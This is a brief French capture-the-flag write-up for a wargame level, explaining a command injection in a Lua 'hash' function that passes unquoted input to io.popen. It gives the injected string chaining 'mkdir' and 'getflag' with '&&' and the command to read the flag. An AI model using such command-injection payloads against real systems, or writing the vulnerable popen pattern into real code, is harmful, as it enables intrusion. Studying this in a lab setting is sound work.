Dans ce niveau la vulnérabilité est dans la fonction `hash`:

...
prog = io.popen("echo "..pass.." | sha1sum", "r")
...

On voit que la variable `pass` est utilisée comme argument de la commande `echo` sans qu'elle soit entourée de guillemets, ce qui est une faille de sécurité. On peut donc utiliser l'opérateur `&&` pour executer une commande en plus, et ajouter un `#` a la fin pour commenter la fin de la commande. J'ai donc envoyé la chaine de caractère `1 && mkdir -p /tmp/flag11 && getflag > /tmp/flag11/flag` ce qui donne la commande:

------

echo 1 && mkdir -p /tmp/flag11 && getflag > /tmp/flag11/flag

------

Apres il suffit de faire la commande:

------

cat /tmp/flag11/flag

------
